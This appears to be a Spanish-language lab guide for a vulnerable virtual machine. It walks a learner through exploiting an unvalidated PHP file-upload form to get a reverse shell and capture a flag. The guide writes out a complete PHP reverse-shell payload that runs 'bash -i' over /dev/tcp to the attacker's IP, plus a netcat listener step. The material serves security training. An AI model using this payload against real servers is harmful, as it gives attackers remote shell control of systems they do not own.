# Reverse Shell en un Servidor Web

En este laboratorio pondrás en práctica el uso de una **shell inversa** para tomar control remoto de un servidor vulnerable. Tu misión es identificar un formulario mal protegido, subir un archivo malicioso y capturar una flag alojada en el sistema. En este laboratorio aprenderás:

- Detección de formularios sin validación de tipo
- Subida de archivos maliciosos
- Ejecución de una reverse shell en PHP
- Toma de control remoto con `netcat`

<how-to-start>
   
## 🌱 Cómo iniciar este laboratorio

Sigue las siguientes instrucciones para comenzar:

1. **Descarga la máquina virtual** desde este [enlace]().
2. **Importa la máquina** en tu gestor de virtualización preferido (VirtualBox, VMware, etc.).
3. Una vez iniciada la máquina, ¡ya puedes comenzar con el laboratorio!
</how-to-start>


## 📄 Instrucciones

El servidor aloja un sitio web desarrollado en PHP, accesible por navegador que tiene un formulario que no valida el tipo de archivo que se sube y es tu responsabilidad preparar una reverse shell funcional y lograr que el servidor se conecte de vuelta a tu máquina.


1. **Explorar el sitio web vulnerable**: Accede a la IP de la máquina desde tu navegador y ubica el formulario de subida de archivos.

2. **Prepara tu reverse shell en PHP**: Crea un archivo llamado `shell.php` con este contenido:

     ```php
     <?php
     exec("/bin/bash -c 'bash -i >& /dev/tcp/TU_IP/4444 0>&1'");
     ?>
     ```

   - Reemplaza `TU_IP` por la IP de tu máquina atacante.

3. **Levantar un listener en tu máquina**

4. **Subir la reverse shell al servidor**

5. **Activa la conexión inversa**. Accede desde el navegador. Si todo está bien, recibirás una shell interactiva en tu terminal.


**Recuerda:** estás en un entorno controlado para fines educativos. El conocimiento ético es tu mejor herramienta. Observa, explora y aprende a identificar configuraciones inseguras.

¡Feliz hackeo!
